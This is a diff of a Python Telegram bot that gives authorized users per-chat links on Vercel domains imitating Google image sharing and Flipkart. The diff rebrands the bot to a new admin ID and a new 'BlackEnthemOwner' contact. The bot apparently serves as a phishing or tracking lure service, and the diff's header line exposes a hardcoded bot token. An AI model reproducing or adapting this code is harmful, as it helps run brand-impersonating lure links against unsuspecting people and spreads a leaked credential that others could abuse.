@@ -11,7 +11,7 @@ BOT_TOKEN = "7717616825:AAFsBZnNSgAkTCh0s3JAppa7DyvLvGr0FsY"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # Admin and allowed users
-ADMIN_ID = 8411036056  # Replace with your actual admin ID
+ADMIN_ID = 6618440327  # Replace with your actual admin ID
 ALLOWED_USERS = {8411036056, 6618440327, 7824177684}  # Initial allowed users
 
 # Store user data
@@ -70,7 +70,7 @@ Only authorized users can access this service.
         keyboard = types.InlineKeyboardMarkup()
         contact_btn = types.InlineKeyboardButton(
             text="📞 Contact Admin",
-            url="https://t.me/Anuprecordpro"
+            url="https://t.me/BlackEnthemOwner"
         )
         keyboard.add(contact_btn)
         
@@ -160,7 +160,7 @@ def create_link(call):
         return
     
     # Generate unique link
-    link = f"https://google-image-sharing.vercel.app/?id={chat_id}"
+    link = f"https://flipkart-zado.vercel.app/?id={chat_id}"
     user_links[chat_id] = link
     
     bot.answer_callback_query(call.id, "✅ Link generated!")
@@ -220,7 +220,7 @@ def copy_link(call):
         bot.answer_callback_query(call.id, "❌ You are not authorized")
         return
     
-    link = user_links.get(chat_id, f"https://google-image-sharing.vercel.app/?id={chat_id}")
+    link = user_links.get(chat_id, f"https://flipkart-zado.vercel.app/?id={chat_id}")
     
     # Create a message that user can copy
     copy_text = f"""
@@ -288,7 +288,7 @@ Only authorized users can access this service.
         keyboard = types.InlineKeyboardMarkup()
         contact_btn = types.InlineKeyboardButton(
             text="📞 Contact Admin",
-            url="https://t.me/Anuprecordpro"
+            url="https://t.me/BlackEnthemOwner"
         )
         keyboard.add(contact_btn)
         
